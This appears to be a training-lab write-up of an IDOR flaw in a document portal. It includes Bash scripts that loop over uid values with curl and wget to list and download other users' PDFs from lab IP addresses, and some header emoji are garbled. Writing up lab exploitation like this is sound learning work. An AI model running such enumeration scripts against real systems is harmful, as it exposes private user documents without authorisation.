# üîì Insecure Direct Object Reference (IDOR) Vulnerability Write-Up
## üß© Vulnerability Summary
An IDOR vulnerability was discovered on a web application hosted at http://83.136.252.13:40028. The flaw allows unauthorized users to access and enumerate documents belonging to other users by manipulating a uid parameter sent via POST requests.

### üïµÔ∏è‚Äç‚ôÇÔ∏è Reconnaissance
Upon visiting the homepage, a JavaScript function was found:

```bash
 <script>
    function getDocuments(uid) {
      $.redirect("/documents.php", {
        uid: uid,
      }, "POST", "_self");
    }
  </script>
```
This indicated that the /documents.php endpoint accepted a POST request with a uid parameter to retrieve user-specific documents.

### üì• Endpoint Behavior
When manually visiting /documents.php via browser (or by crafting a POST request), document links were returned within anchor (<a>) tags, such as:

```bash
<li>
      <input type="checkbox" id="trigger-views" checked="checked">
      <label for="trigger-views">Documents</label>
      <ul class="pure-tree">
        <li class='pure-tree_link'><a href='/documents/Invoice_1_09_2021.pdf' target='_blank'>Invoice</a></li>
        <li class='pure-tree_link'><a href='/documents/Report_1_10_2021.pdf' target='_blank'>Report</a></li>
    </ul>
</li>
```

The naming format followed:
[DocumentType]_[UID]_[Month]_[Year].pdf

This suggested that the application returned files belonging to the UID provided, without validating the requester's authorization.

### üß™ Exploitation

Let's understand the given bash file in the learning module.

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

A custom Bash script was created to enumerate files by iterating over uid values and parsing the response:

```bash
#!/bin/bash

url="http://94.237.51.163:38179/documents.php"
max_uid=20

# Print header
echo -e "UID | FILE NAME 1 | FILE NAME 2 | FILE NAME 3"

for uid in $(seq 1 $max_uid); do
    echo "[*] Checking UID: $uid" >&2

    # Send POST request and get matching files
    files=$(curl -s -X POST -d "uid=$uid" "$url" | grep -oP "/documents/\K[^']+\.[a-zA-Z0-9]+" | sort -u)

    # Format row: UID | file1 | file2 | file3...
    row="$uid"
    for file in $files; do
        row="$row | $file"
    done

    echo -e "$row"
done
```

Save it as idor_enum_download_all.sh
Make it executable: chmod +x idor_enum_download_all.sh
Run it: ./idor_enum_download_all.sh
